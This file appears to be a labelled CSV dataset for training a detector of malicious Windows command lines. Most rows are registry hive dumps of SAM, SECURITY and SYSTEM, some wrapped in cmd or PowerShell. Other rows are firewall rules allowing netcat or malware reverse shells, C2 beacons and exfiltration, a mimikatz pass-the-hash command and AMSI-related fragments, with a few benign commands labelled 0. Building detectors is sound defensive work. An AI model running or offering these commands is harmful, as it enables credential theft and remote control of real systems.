text,label
reg save hklm\security c:\windows\temp\cyvbhrky.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\wc84ksjd.dat""""",1
reg save hklm\security c:\windows\temp\ewufzgjk.save,1
reg save hklm\sam c:\windows\temp\9pg1okgl.save,1
reg save hklm\sam c:\windows\temp\xbzo5rrp.save,1
reg save hklm\system c:\windows\temp\dhbd1pn3.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\ei9lcrlr.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\windows\temp\u9lzsl5q.save""",1
reg save hklm\security c:\windows\temp\g1r4q2l1.save,1
reg save hklm\system c:\windows\temp\pc6tbhq0.save,1
reg save hklm\sam c:\windows\temp\6w9n3q1q.save,1
reg save hklm\sam c:\windows\temp\302hzyl4.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\n9groti0.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\d9osrs4w.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ulm8cv3f.dat""",1
reg export hklm\system c:\windows\temp\ad9v63st.save,1
reg  save  hklm\security  c:\windows\temp\vjuyaytn.save,1
"cmd.exe /c ""rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg export hklm\sam c:\windows\temp\jrqn8epk.save,1
reg save hklm\sam c:\windows\temp\mi8da3z9.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\flnnr1wd.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\uwhyoyjd.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\3kic013n.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\c12itz28.dat""",1
reg export hklm\sam c:\windows\temp\w2xq5vvv.save,1
"wmic   product   get   name,   version",0
"powershell -nop -c ""reg export hklm\sam c:\temp\xzy5wjr0.dat""",1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\t8phpwpr.save""",1
"powershell -nop -c ""rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\j83zmoe3.dat""""",1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\sam c:\temp\rnz1xytb.dat""""",1
reg save hklm\sam c:\windows\temp\h9iyihh1.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\7juh882d.dat""",1
sc  query  windefend,0
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\hcdb8vbg.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\heqgxixp.dat""",1
reg save hklm\system c:\windows\temp\k0og5iu5.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\gqsmjgcl.dat""",1
"powershell -nop -c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337,2
"cmd.exe /c ""reg save hklm\security c:\temp\qau0ja06.dat""",1
"cmd.exe /c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: tcp 8888""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\x8auc1hc.dat""",1
reg export hklm\sam c:\windows\temp\mhx89tc9.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\2q123q6u.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\85sbecsw.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\6qlbf80g.dat""",1
reg save hklm\sam c:\windows\temp\oixyxrku.save,1
reg save hklm\sam c:\windows\temp\cu8hrf3x.save,1
reg save hklm\system c:\windows\temp\4voml35x.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\30286xd4.dat""",1
rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337,2
"powershell -nop -c ""reg save hklm\sam c:\temp\7zbbyqeu.dat""",1
reg save hklm\system c:\windows\temp\f8sp0qug.save,1
reg export hklm\system c:\windows\temp\gw6brkqg.save,1
reg save hklm\sam c:\windows\temp\tugjqu43.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\avslpa5v.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\83cl25o1.dat""",1
reg   save   hklm\sam   c:\windows\temp\9p76iubw.save,1
reg save hklm\sam c:\windows\temp\x26pldx7.save,1
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"powershell -nop -c ""reg save hklm\sam c:\windows\temp\xrhc8b2r.save""",1
reg save hklm\sam c:\windows\temp\ac7yt3iv.save,1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\myrcsg1p.save""",1
reg   export   hklm\system   c:\windows\temp\il5od4hc.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\outye9k7.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\9pph1v6x.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\5we0gl0z.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\1kaqpvj1.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\1ts7pdws.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\wvpvojvp.dat""",1
reg export hklm\sam c:\windows\temp\jwdv88n8.save,1
reg save hklm\security c:\windows\temp\dnqotv85.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\qmcrui97.dat""",1
reg  save  hklm\system  c:\windows\temp\x2vd8ubt.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\93qu7vc9.dat""",1
reg export hklm\sam c:\windows\temp\yrgucirt.save,1
reg export hklm\security c:\windows\temp\kwht5fqk.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\lboqiiwu.dat""",1
reg save hklm\system c:\windows\temp\jojs3uvt.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\z8x02vyc.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\7wiea0fs.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\p9l3yuvz.dat""",1
reg export hklm\security c:\windows\temp\u4xdeppk.save,1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\yn78z430.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\7qlx2jyu.dat""",1
"powershell -nop -c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: 4444""",2
"cmd.exe /c ""reg export hklm\security c:\temp\o011rzy5.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\orhsfhfa.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\oniy24lf.dat""",1
reg export hklm\security c:\windows\temp\n5ch8a95.save,1
reg export hklm\security c:\windows\temp\gzgfbmms.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\yf6fqm5p.dat""",1
reg save hklm\sam c:\windows\temp\u7k9o0sw.save,1
reg export hklm\security c:\windows\temp\p7q9k6ep.save,1
reg export hklm\sam c:\windows\temp\nki8zedy.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\osz47ebj.dat""",1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\7o49zkfz.save""",1
reg export hklm\sam c:\windows\temp\i99wukmh.save,1
reg save hklm\security c:\windows\temp\kq02plze.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\gwze9zx4.dat""",1
reg export hklm\system c:\windows\temp\ho2g2sol.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\7yf2oyyx.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\wjwf0eaz.dat""",1
rule: reverse shell | app: any | dir: outbound | act: allow | port: 4444,2
rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337,2
reg   export   hklm\sam   c:\windows\temp\hg050az3.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\xqpu360s.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\kffep42m.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\31c08c8z.dat""",1
reg export hklm\system c:\windows\temp\alzmnwcr.save,1
reg save hklm\sam c:\windows\temp\axzs2uls.save,1
reg save hklm\sam c:\windows\temp\yb2l7a0x.save,1
reg export hklm\sam c:\windows\temp\10lagbzy.save,1
"cmd.exe /c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888""",2
"powershell -nop -c ""reg export hklm\security c:\temp\8b8tkl4n.dat""",1
reg save hklm\system c:\windows\temp\rh5l2bi3.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\etifkvk6.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\4lxpj7rk.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\w2wztc5u.dat""",1
reg save hklm\security c:\windows\temp\mz7r6w5a.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\7u5zw7kj.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\2n7nll9e.dat""",1
reg save hklm\security c:\windows\temp\oqk1kyg4.save,1
sekurlsa::pth,3
reg save hklm\sam c:\windows\temp\ny48r1aq.save,1
reg save hklm\security c:\windows\temp\8fo4xbsu.save,1
reg export hklm\security c:\windows\temp\5hi2oddq.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\cn1phcyv.dat""",1
reg export hklm\system c:\windows\temp\kscbol8i.save,1
reg export hklm\security c:\windows\temp\vwpicvu0.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\jshfd6f8.dat""",1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\xxzfvyig.save""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\84xlnptd.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\xnfdoq7j.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\t6uvqb8l.dat""",1
reg export hklm\sam c:\windows\temp\jpm6o6rt.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\tjyhl1xc.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\z91b9hfi.dat""",1
"powershell -nop -c ""rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\vwkv2rft.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\e6nqhc2i.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\24ighlf1.dat""",1
reg export hklm\sam c:\windows\temp\278do30s.save,1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\2wqmprll.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\jof3vhie.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\ox6r7gqc.dat""",1
reg export hklm\security c:\windows\temp\updrh7rk.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\njs7nexc.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\5r0aklku.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\aim9w4x7.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\vgkw7cfa.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\xpekoso3.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\1bxrh3od.dat""",1
reg   export   hklm\system   c:\windows\temp\jwabf844.save,1
"powershell -nop -c ""rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\8zn1o09r.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\u2pj76yq.dat""",1
reg export hklm\sam c:\windows\temp\xssnty85.save,1
reg export hklm\system c:\windows\temp\hpanhgll.save,1
"powershell -nop -c ""reg save hklm\security c:\windows\temp\6grtliwt.save""",1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\2blsdsaj.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\yxs5nads.dat""",1
rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337,2
"cmd.exe /c ""reg export hklm\security c:\temp\swhljjyr.dat""",1
reg save hklm\sam c:\windows\temp\zio1l3lr.save,1
reg save hklm\sam c:\windows\temp\sbyat3lb.save,1
reg save hklm\security c:\windows\temp\6fwwuf0y.save,1
"cmd.exe /c ""rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe /c ""reg export hklm\security c:\temp\h3gow3gl.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\ookp8hrh.dat""",1
reg export hklm\security c:\windows\temp\s5fubi6e.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\p2u3ape4.dat""",1
reg   export   hklm\security   c:\windows\temp\yvn8jhvd.save,1
reg save hklm\security c:\windows\temp\woneheko.save,1
reg save hklm\security c:\windows\temp\lvwoo6mi.save,1
"powershell -nop -c ""rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg  save  hklm\sam  c:\windows\temp\nanyke4b.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\9avald2n.dat""",1
reg   save   hklm\security   c:\windows\temp\xmzdkf3a.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\5mybtghk.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\i659agq9.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\phmn7566.dat""",1
"[dllimport(""advapi32.dll"")]   extern   bool   amsiutils(...)",3
"cmd.exe /c ""reg save hklm\security c:\temp\hmrvkhjw.dat""",1
reg save hklm\sam c:\windows\temp\glh3laq9.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\p8hl6qv3.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\lb8tsz7o.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\h8fm4cx5.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\5uqx13b3.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\w5tea2jc.dat""",1
reg save hklm\sam c:\windows\temp\2xjaily1.save,1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\bsampjks.dat""",1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\qxgb111k.save""",1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\6upjrjoh.save""",1
"powershell -nop -c ""reg save hklm\system c:\windows\temp\ryu5e8ew.save""",1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\vogo7ibh.save""",1
"powershell -nop -c ""rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444""",2
"powershell -nop -c ""rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"cmd.exe /c ""reg export hklm\security c:\temp\nihswgeh.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\9tif5nt6.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\kzklyk9i.dat""""",1
reg export hklm\system c:\windows\temp\f5ynnp7t.save,1
reg export hklm\system c:\windows\temp\5xb19klo.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\4j85rhg0.dat""",1
reg export hklm\security c:\windows\temp\4kahklxe.save,1
reg export hklm\security c:\windows\temp\te4mc4wn.save,1
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\mv1yya84.save""",1
node server.js --port 3000,0
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\hzd8uihf.dat""",1
reg export hklm\system c:\windows\temp\jxbsiuey.save,1
reg export hklm\system c:\windows\temp\pq58kjtt.save,1
reg export hklm\sam c:\windows\temp\8fwroztn.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\64cz0otm.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\6il5lmx0.dat""",1
reg save hklm\security c:\windows\temp\cuwhpqkf.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\dr11fswp.dat""",1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\hbavi63b.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\1egu6382.dat""",1
"cmd.exe /c ""rule:  reverse  shell  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg save hklm\sam c:\windows\temp\tgy663l1.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\61ckpi7u.dat""",1
"powershell -nop -c ""ipconfig  /all""",0
reg export hklm\sam c:\windows\temp\bqx81r90.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\57x6y4zg.dat""",1
reg save hklm\sam c:\windows\temp\lnsl7gmz.save,1
reg export hklm\sam c:\windows\temp\smiz059i.save,1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\sn34dijq.dat""",1
ping 8.8.8.8,0
"powershell -nop -c ""reg export hklm\sam c:\temp\4g62wxq0.dat""",1
reg export hklm\security c:\windows\temp\b4yut4s8.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\oivtavec.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ewt3pzdq.dat""",1
reg export hklm\sam c:\windows\temp\ts70cq23.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\8wz6dtpz.dat""",1
"powershell -nop -c ""rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"powershell -nop -c ""reg save hklm\security c:\temp\a3lbez4f.dat""",1
reg save hklm\security c:\windows\temp\4z4g2hgm.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\v60em2g0.dat""",1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\r19b9axn.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\mkvdswp8.dat""",1
reg export hklm\sam c:\windows\temp\5tsl6pb5.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\5r7wpbat.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\vrplrnpm.dat""",1
reg save hklm\security c:\windows\temp\w151tcgz.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ualdpzxq.dat""",1
"powershell -nop -c ""rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg  save  hklm\system  c:\windows\temp\pwegtekz.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\0ldmhfmx.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\7l4ubt5a.dat""",1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\wmp1hd14.save""",1
reg save hklm\sam c:\windows\temp\ns15v5hm.save,1
reg save hklm\security c:\windows\temp\e89boc6d.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\nc7qbezv.dat""",1
"powershell -nop -c ""rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"powershell -nop -c ""$a  =  [ref].assembly.gettype('system.management.automation.duplicatetokenex')""",3
reg save hklm\security c:\windows\temp\2h4msui2.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\coa1mng7.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\ntv640f7.dat""",1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\security c:\temp\x8ajxa8i.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\rym8m8df.dat""",1
reg export hklm\sam c:\windows\temp\y3mz2asy.save,1
reg save hklm\sam c:\windows\temp\fq2h1xng.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\t8qvr1os.dat""",1
rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888,2
"cmd.exe /c ""reg save hklm\sam c:\temp\5ulwrhhx.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\qqs34zr3.dat""",1
"powershell -nop -c ""ping   8.8.8.8""",0
reg export hklm\security c:\windows\temp\4gdwon5q.save,1
reg export hklm\security c:\windows\temp\aak2k399.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\jg6wdl8j.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\dzepmxi1.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\hkzfij8f.dat""",1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\ha8r1itq.save""",1
reg export hklm\sam c:\windows\temp\rv2p1qc2.save,1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\74c7uq6h.save""",1
"powershell -nop -c ""rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"cmd.exe /c ""reg export hklm\security c:\temp\hishy8lo.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\c0ju3h81.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\fx7eyd9q.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\ql3fskyt.dat""",1
reg  save  hklm\system  c:\windows\temp\njz4gzk6.save,1
"cmd.exe /c ""rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg export hklm\security c:\windows\temp\4qrsi8o3.save,1
"cmd.exe /c ""rule:  reverse  shell  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg save hklm\sam c:\windows\temp\wo33ev1v.save,1
"cmd.exe /c ""get-help  adjusttokenprivileges  -full""",0
"powershell -nop -c ""reg export hklm\sam c:\temp\bus3z3f1.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\q132jyb3.dat""",1
reg export hklm\system c:\windows\temp\q5h09iti.save,1
reg   save   hklm\system   c:\windows\temp\77ze4ha6.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\qdk2wron.dat""",1
